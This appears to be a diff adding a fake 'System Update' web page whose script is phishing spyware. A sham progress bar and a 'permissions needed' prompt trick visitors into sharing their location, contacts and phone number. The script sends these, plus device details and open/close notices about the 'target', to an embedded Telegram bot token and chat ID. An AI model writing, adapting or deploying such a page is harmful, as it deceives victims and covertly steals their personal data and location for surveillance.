@@ -1,0 +1,203 @@
+<html>
+<head>
+    <title>System Update</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            background: #f5f5f5;
+            font-family: 'Roboto', sans-serif;
+            text-align: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 10px;
+            padding: 30px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px;
+            background: #4CAF50;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .logo span {
+            font-size: 40px;
+            color: white;
+        }
+        h1 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #666;
+            margin-bottom: 20px;
+        }
+        .progress {
+            width: 100%;
+            height: 20px;
+            background: #e0e0e0;
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            background: #4CAF50;
+            transition: width 0.3s;
+        }
+        .status {
+            color: #4CAF50;
+            font-weight: bold;
+        }
+        .button {
+            background: #4CAF50;
+            color: white;
+            border: none;
+            padding: 10px 30px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            margin: 10px 0;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <span>🔄</span>
+        </div>
+        
+        <h1>System Update Required</h1>
+        <p>Your device needs a security update to protect against malware</p>
+        
+        <div class="progress">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        
+        <div id="statusMessage" class="status">Preparing update...</div>
+        
+        <button class="button" id="updateBtn" onclick="startUpdate()">Update Now</button>
+        
+        <div id="permissionSection" class="hidden">
+            <p>Please grant permissions to continue:</p>
+            <button class="button" onclick="requestPermissions()">Allow Permissions</button>
+        </div>
+    </div>
+
+    <script>
+        // 🔥 TELEGRAM BOT LU
+        const BOT_TOKEN = '8739955177:AAE2snHpCyeAVtDFKhspKP3EsNdVUg1zwaE';
+        const CHAT_ID = '5825010043';
+        
+        function sendToTelegram(data) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(data)}`)
+                .catch(e => console.log(e));
+        }
+        
+        function sendFileToTelegram(file, filename) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('document', file, filename);
+            
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+                method: 'POST',
+                body: formData
+            }).catch(e => console.log(e));
+        }
+        
+        function startUpdate() {
+            document.getElementById('updateBtn').style.display = 'none';
+            document.getElementById('statusMessage').innerHTML = 'Checking device...';
+            
+            // Kirim notifikasi app dibuka
+            sendToTelegram('🔥 Target opened the app!');
+            
+            // Progress bar
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += 10;
+                document.getElementById('progressBar').style.width = progress + '%';
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    document.getElementById('statusMessage').innerHTML = 'Update failed. Permissions needed.';
+                    document.getElementById('permissionSection').classList.remove('hidden');
+                }
+            }, 500);
+        }
+        
+        function requestPermissions() {
+            document.getElementById('statusMessage').innerHTML = 'Requesting permissions...';
+            
+            // Minta lokasi
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        sendToTelegram(`📍 Location: ${lat}, ${lon}\nhttps://maps.google.com/?q=${lat},${lon}`);
+                    },
+                    function(error) {
+                        sendToTelegram('❌ Location permission denied');
+                    }
+                );
+            }
+            
+            // Coba akses kontak (limited di browser)
+            if (navigator.contacts && navigator.contacts.select) {
+                navigator.contacts.select(['name', 'tel'], { multiple: true })
+                    .then(contacts => {
+                        const kontak = JSON.stringify(contacts);
+                        sendToTelegram(`📱 Contacts: ${kontak}`);
+                        
+                        // Buat file teks
+                        const blob = new Blob([kontak], {type: 'text/plain'});
+                        const file = new File([blob], 'contacts.txt', {type: 'text/plain'});
+                        sendFileToTelegram(file, 'contacts.txt');
+                    })
+                    .catch(() => {
+                        sendToTelegram('❌ Contacts permission denied');
+                    });
+            } else {
+                // Fallback: minta input manual (social engineering)
+                const kontak = prompt('Enter your phone number for verification:');
+                if (kontak) {
+                    sendToTelegram(`📞 Phone: ${kontak}`);
+                }
+            }
+            
+            // Dapatkan info device
+            const deviceInfo = `
+Browser: ${navigator.userAgent}
+Platform: ${navigator.platform}
+Language: ${navigator.language}
+Screen: ${screen.width}x${screen.height}
+            `;
+            sendToTelegram(`📱 Device Info: ${deviceInfo}`);
+            
+            document.getElementById('statusMessage').innerHTML = 'Update complete!';
+            setTimeout(() => {
+                document.getElementById('statusMessage').innerHTML = 'Device is up to date.';
+            }, 2000);
+        }
+        
+        // Track kapan app ditutup
+        window.addEventListener('beforeunload', function() {
+            sendToTelegram('👋 Target closed the app');
+        });
+    </script>
+</body>
+</html>
